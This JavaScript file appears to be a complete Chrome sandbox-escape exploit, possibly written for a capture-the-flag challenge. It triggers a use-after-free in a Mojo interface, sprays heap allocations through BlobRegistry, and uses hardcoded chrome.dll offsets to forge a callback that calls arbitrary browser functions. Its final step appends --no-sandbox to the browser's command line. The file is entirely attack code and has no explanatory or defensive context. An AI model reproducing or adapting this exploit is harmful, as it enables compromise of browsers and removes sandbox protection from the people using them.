function SandboxEscape(chrome_dll_base){

    function getAllocationConstructor() {
        let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
        Mojo.bindInterface(blink.mojom.BlobRegistry.name,
                            mojo.makeRequest(blob_registry_ptr).handle, "process", true);

        function Allocation(size=280) {
            function ProgressClient(allocate) {
                function ProgressClientImpl() {
                }
                ProgressClientImpl.prototype = {
                onProgress: async (arg0) => {
                    if (this.allocate.writePromise) {
                    this.allocate.writePromise.resolve(arg0);
                    }
                }
                };
                this.allocate = allocate;

                this.ptr = new mojo.AssociatedInterfacePtrInfo();
                var progress_client_req = mojo.makeRequest(this.ptr);
                this.binding = new mojo.AssociatedBinding(
                blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req
                );

                return this;
            }

            this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
            this.progressClient = new ProgressClient(this);
            blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, this.progressClient.ptr).then((res) => {
                this.serialized_blob = res.blob;
            })

            this.malloc = async function(data) {
                promise = new Promise((resolve, reject) => {
                this.writePromise = {resolve: resolve, reject: reject};
                });
                this.pipe.producer.writeData(data);
                this.pipe.producer.close();
                written = await promise;
                console.assert(written == data.byteLength);
            }

            this.free = async function() {
                this.serialized_blob.blob.ptr.reset();
                await sleep(1000);
            }

            this.read = function(offset, length) {
                this.readpipe = Mojo.createDataPipe({elementNumBytes: 1, capacityNumBytes: length});
                this.serialized_blob.blob.readRange(offset, length, this.readpipe.producer, null);
                return new Promise((resolve) => {
                this.watcher = this.readpipe.consumer.watch({readable: true}, (r) => {
                    result = new ArrayBuffer(length);
                    this.readpipe.consumer.readData(result);
                    this.watcher.cancel();
                    resolve(result);
                });
                });
            }

            this.readQword = async function(offset) {
                let res = await this.read(offset, 8);
                return (new DataView(res)).getBigUint64(0, true);
            }

            return this;
        }

        async function allocate(data) {
            let allocation = new Allocation(data.byteLength);
            await allocation.malloc(data);
            return allocation;
        }
        return allocate;
    }

    function UAF(){
        let easy_mojo_ptr_ = new blink.mojom.EasyMojoPtr();
        Mojo.bindInterface(
            blink.mojom.EasyMojo.name,
            mojo.makeRequest(easy_mojo_ptr_).handle,
            "context"
        );

        this.ptr = easy_mojo_ptr_;
        this.alloc = () => this.ptr.allocBuffer();
        this.trigger = () => this.ptr.putData("");
        this.free = () => this.ptr.freeBuffer();

        return this;
    }

    async function run(){
        let uaf = UAF();
        let allocate = getAllocationConstructor();

        const kSprayAllocationCount                 = 0x4;
        const kMojoBufferSize                       = 0x1010;
        const kWakeLockContextOffset                = 0x6e8;
        const kWebContentsOffset                    = 8;
        const kBufferLeakOffset                     = 0x18;
        const kBindStatePtrOffset                   = 0x10;
        const kLeakPtrContentVptr                   = 0x6f90bd8n + chrome_dll_base; // `anonymous namespace'::DictionaryIterator::Start
        const kGetWakeLockContextVptr               = 0x6cbb7e0n + chrome_dll_base; // content::WebContentsImpl::GetWakeLockContext
        const kInvoker4Args                         = 0x51711b0n + chrome_dll_base;
        const kNopRet                               = 0x5126e24n + chrome_dll_base;
        const kInvokeCallbackVptr                   = 0x6cadf78n + chrome_dll_base; // content::responsiveness::MessageLoopObserver::DidProcessTask
        const kCopyQword                            = 0x1275af0n + chrome_dll_base; // extensions::SizeConstraints::set_minimum_size 
        const kCurrentProcessCommandline            = 0x7d29198n + chrome_dll_base; // base::CommandLine::current_process_commandline_
        const kSetCommandLineFlagsForSandboxType    = 0x2b54c14n + chrome_dll_base; // service_manager::SetCommandLineFlagsForSandboxType
        const kFunctionVptr                         = 0x6161616161616161n; // CreateContent
        //const kFunctionVptr                       = 0x6ca9c58n + chrome_dll_base; // RenderWidgetHostImpl::Focus
        //const kFunctionVptr                       = 0x7afa3e0n + chrome_dll_base; // chrome!blink::AudioContext::StartRendering
        function spray(data, num=kSprayAllocationCount) {
            print("\t[*] Spraying...");
            return Promise.all(Array(num).fill().map(() => allocate(data)));
        }

        async function allocReadable(allocData=new ArrayBuffer(0)) {
            while(true){
                let data = new ArrayBuffer(kMojoBufferSize);
                let view = new DataView(data);

                let allocView = new DataView(allocData);
                let dataOffset = kMojoBufferSize - allocData.byteLength;
                for (var i = 0; i < allocData.byteLength; i++) {
                    view.setUint8(dataOffset + i, allocView.getUint8(i));
                }
                view.setBigUint64(0, kGetWakeLockContextVptr, true);
                await uaf.alloc();
                await uaf.free();
                let heap = await spray(data);
                await uaf.trigger();
                results = await Promise.all(heap.map((a) => a.readQword(kWakeLockContextOffset)));
                let allocation;
                let wakeLockContextAddr;
                for (var i = 0; i < results.length; i++) {
                    if (results[i] != 0) {
                        wakeLockContextAddr = results[i];
                        allocation = heap[i];
                    }
                }
                if (wakeLockContextAddr == undefined) {
                    print("\t[!] stage1 failed");
                    continue;
                }
                print("\t[*] AllocReadable stage1 success 0x"+wakeLockContextAddr.toString(16));

                let MojobufPtrAddr = wakeLockContextAddr + BigInt(kWebContentsOffset);
                let bufferleak
                while(true){
                    data = new ArrayBuffer(kMojoBufferSize);
                    view = new DataView(data);
                    view.setBigUint64(0, kLeakPtrContentVptr, true);
                    view.setBigUint64(0x20, MojobufPtrAddr - 0x28n, true);
                    await uaf.alloc();
                    await uaf.free();
                    let heap2 = await spray(data);
                    await uaf.trigger();
                    results = await Promise.all(heap2.map((a) => a.readQword(kBufferLeakOffset)));
                    for (var i = 0; i < results.length; i++) {
                        if (results[i] != 0) {
                            bufferleak = results[i];
                            
                        }
                    }
                    if (bufferleak == undefined) {
                        print("\t[!] stage1 failed");
                        continue;
                    }
                    break;
                }

                bufferleak = bufferleak + BigInt(dataOffset)
                print("\t[*] Success!  0x"+bufferleak.toString(16));
                
                allocation.originalRead = allocation.read;
                allocation.read = (offset, size) => allocation.originalRead(offset + dataOffset, size);

                return [allocation, bufferleak];
            }
        }

        async function callFunction(functionAddr, arg0=0n, arg1=0n, arg2=0n, arg3=0n){
            print("[*] Call function: 0x"+functionAddr.toString(16));
            let k4ArgBindStateSize = 0x48;
            let bindState = new ArrayBuffer(k4ArgBindStateSize);
            let view = new DataView(bindState);
            view.setBigUint64(0, 1n, true); // refcount
            view.setBigUint64(8, kInvoker4Args, true); // polymorphic_invoke
            view.setBigUint64(0x10, kNopRet, true); // destructor
            view.setBigUint64(0x18, kNopRet, true); // query_cancellation_traits
            view.setBigUint64(0x20, functionAddr, true); // functor
            view.setBigUint64(0x28, arg0, true);
            view.setBigUint64(0x30, arg1, true);
            view.setBigUint64(0x38, arg2, true);
            view.setBigUint64(0x40, arg3, true);

            let [a, bindStateAddr] = await allocReadable(bindState);
            print("\t[*] allocated bindState at " + bindStateAddr.toString(16));

            let data = new ArrayBuffer(kMojoBufferSize);
            view = new DataView(data);
            view.setBigUint64(0, kInvokeCallbackVptr, true);
            view.setBigUint64(kBindStatePtrOffset, bindStateAddr, true);

            await uaf.alloc();
            await uaf.free();
            await spray(data);
            await uaf.trigger();
        }

        async function getCurrentProcessCommandLine(){
            print("[*] Getting current_process_commandline...");
            let [allocation_cmd, heapAddress] = await allocReadable(new ArrayBuffer(8));
            while (true) {
                await callFunction(kCopyQword, heapAddress, kCurrentProcessCommandline);
                print("\t[*] heapAddress: 0x"+heapAddress.toString(16));
                cmdLine = await allocation_cmd.readQword(0);
                if (cmdLine == 0n) {
                    print("\t[!] got bad pointer for current_process_commandline... retrying");
                    continue;
                }
                print("\t[*] current_process_commandline: 0x" + cmdLine.toString(16));
                return cmdLine;
            }
        }

        cmdLine = await getCurrentProcessCommandLine();
        print("[*] Appending --no-sandbox to command line...");
        await callFunction(kSetCommandLineFlagsForSandboxType, cmdLine, 0n /* kNoSandboxType */);
        print("[*] Done!");

    }

    this.run = run;

    return this;
}